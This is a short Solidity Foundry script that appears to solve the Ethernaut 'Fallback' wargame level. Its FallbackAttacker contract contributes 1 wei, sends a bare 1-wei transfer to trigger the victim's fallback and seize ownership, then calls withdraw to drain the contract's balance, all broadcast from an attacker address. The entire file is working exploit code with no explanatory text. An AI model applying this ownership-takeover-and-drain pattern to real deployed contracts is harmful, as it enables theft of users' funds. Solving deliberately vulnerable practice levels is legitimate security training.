// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";


interface IFallback {
    function contribute() external payable;
    function withdraw() external;
}

contract FallbackAttacker is Constants, Script {

    function run() public {
        IFallback victim = IFallback(FALLBACK_ADDRESS);
        
        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }
    
    // Must be external/public to be payable
    function attack(IFallback victim) public payable {
        victim.contribute{value: 1 wei}();
        address(victim).call{value: 1 wei}("");
        victim.withdraw();
    }

    receive() external payable {}
}